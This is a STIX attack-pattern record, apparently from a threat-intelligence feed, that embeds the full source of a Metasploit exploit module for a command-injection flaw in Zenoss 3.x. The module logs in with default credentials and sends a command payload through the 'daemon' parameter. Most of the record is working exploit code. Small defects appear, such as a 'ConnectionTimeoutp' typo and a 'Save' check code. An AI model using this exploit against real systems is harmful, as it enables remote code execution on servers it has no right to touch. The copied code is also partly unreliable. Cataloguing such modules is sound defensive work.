{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ec339788-6a82-416a-8aa9-0b6fd7e8a3d6",
    "created": "2024-08-14T17:00:28.743942Z",
    "modified": "2024-08-14T17:00:28.743946Z",
    "name": "Zenoss 3 showDaemonXMLConfig Command Execution",
    "description": " This module exploits a command execution vulnerability in Zenoss 3.x which could be abused to allow authenticated users to execute arbitrary code under the context of the 'zenoss' user. The show_daemon_xml_configs() function in the 'ZenossInfo.py' script calls Popen() with user controlled data from the 'daemon' parameter.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zenoss_showdaemonxmlconfig_exec.rb",
            "external_id": "zenoss_showdaemonxmlconfig_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zenoss 3 showDaemonXMLConfig Command Execution',\n      'Description'    => %q{\n        This module exploits a command execution vulnerability in Zenoss 3.x\n        which could be abused to allow authenticated users to execute arbitrary\n        code under the context of the 'zenoss' user. The show_daemon_xml_configs()\n        function in the 'ZenossInfo.py' script calls Popen() with user\n        controlled data from the 'daemon' parameter.\n      },\n      'References'     =>\n        [\n          ['URL', 'http://itsecuritysolutions.org/2012-07-30-zenoss-3.2.1-multiple-security-vulnerabilities/'],\n          ['OSVDB', '84408']\n        ],\n      'Author'         =>\n        [\n          'bcoles', # Discovery and exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'Privileged'     => false,\n      'Arch'           => ARCH_CMD,\n      'Platform'       => 'unix',\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true,\n          'Compat'\t=>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic python perl',\n            },\n        },\n      'Targets'        =>\n        [\n          [\n            'Automatic Targeting', { 'auto' => true }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-07-30'\n    ))\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('USERNAME', [true, 'The Zenoss username', 'admin']),\n      OptString.new('PASSWORD', [true, 'The Zenoss password', 'zenoss'])\n    ])\n  end\n\n  def check\n    # retrieve software version from login page\n    begin\n      res = send_request_raw({\n        'method' => \"GET\",\n        'uri'    => \"/zport/acl_users/cookieAuthHelper/login_form\"\n      })\n      return Exploit::CheckCode::Appears if res.body =~ /<p>Copyright &copy; 2005-20[\\d]{2} Zenoss, Inc\\. \\| Version\\s+<span>3\\./\n      return Exploit::CheckCode::Detected   if res.body =~ /<link rel=\"shortcut icon\" type=\"image\\/x\\-icon\" href=\"\\/zport\\/dmd\\/favicon\\.ico\" \\/>/\n      return Exploit::CheckCode::Safe\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeoutp\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n    return Exploit::CheckCode::Save\n  end\n\n  def exploit\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    command  = URI::DEFAULT_PARSER.escape(payload.encoded)+\"%26\"\n    postdata = \"__ac_name=#{username}&__ac_password=#{password}&daemon=#{command}\"\n\n    # send payload\n    print_status(\"Sending payload to Zenoss (#{command.length.to_s} bytes)\")\n    begin\n      res = send_request_cgi({\n        'method'    => 'POST',\n        'uri'       => \"/zport/About/showDaemonXMLConfig\",\n        'data'      => \"#{postdata}\",\n      })\n      if res and res['Bobo-Exception-Type'] =~ /^Unauthorized$/\n        print_error(\"Authentication failed. Incorrect username/password.\")\n        return\n      end\n      print_good(\"Sent payload successfully\")\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Connection failed\")\n    rescue\n      print_error(\"Sending payload failed\")\n    end\n\n    handler\n\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-07-30",
    "x_mitre_platforms": [
        "unix'"
    ]
}